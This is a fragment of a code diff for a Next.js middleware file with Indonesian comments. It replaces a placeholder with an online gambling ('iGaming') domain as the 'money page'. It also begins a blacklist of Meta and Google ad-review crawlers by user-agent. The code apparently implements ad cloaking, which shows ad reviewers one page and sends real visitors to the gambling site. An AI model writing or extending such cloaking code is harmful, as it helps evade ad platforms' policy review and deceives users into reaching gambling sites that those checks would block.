@@ -6,7 +6,7 @@ export function middleware(request: NextRequest) {
   const userAgent = request.headers.get('user-agent') || '';
   
   // URL situs iGaming yang baru lu beli
-  const MONEY_PAGE = 'https://link-situs-asli-lu.com'; 
+  const MONEY_PAGE = 'https://dewa76.shop'; 
 
   // 2. Daftar Hitam (Blacklist) Robot & Crawler Meta/Google
   // Ini adalah kata kunci yang dipakai oleh robot pemeriksa iklan
